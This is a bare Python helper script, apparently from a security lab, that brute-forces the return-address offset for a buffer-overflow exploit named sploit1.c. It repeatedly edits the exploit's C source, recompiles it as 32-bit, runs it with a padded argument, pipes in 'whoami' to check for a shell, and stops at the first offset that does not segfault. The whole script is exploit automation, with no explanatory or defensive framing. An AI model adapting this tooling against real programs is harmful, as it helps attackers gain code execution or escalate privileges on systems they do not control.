import os
import subprocess

# Function to compile the sploit1.c file
def compile_sploit():
    cmd = "gcc -ggdb -m32 sploit1.c -o sploit1"
    subprocess.call(cmd, shell=True)

# Function to run the sploit1 program with a specific offset
def run_sploit(offset):
    cmd = f"echo whoami | ./sploit1 \"$(python3 -c 'print (\"A\"*100)')\""
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout, result.stderr

# Function to modify the sploit1.c file with a specific offset
def modify_sploit(offset):
    with open("sploit1.c", "r") as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if "unsigned int return_address = (unsigned int)argv[1] + OFFSET_TO_RET +" in line:
            lines[i] = f"    unsigned int return_address = (unsigned int)argv[1] + OFFSET_TO_RET + {offset};\n"
            break

    with open("sploit1.c", "w") as file:
        file.writelines(lines)

# Brute force the offset value
for offset in range(0, 1000, 50):
    print(f"Trying offset: {offset}")
    modify_sploit(offset)
    compile_sploit()
    stdout, stderr = run_sploit(offset)

    if "Segmentation fault" not in stderr:
        print(f"Offset {offset} succeeded!")
        print("stdout:")
        print(stdout)
        print("stderr:")
        print(stderr)
        break
    else:
        print(f"Offset {offset} failed.")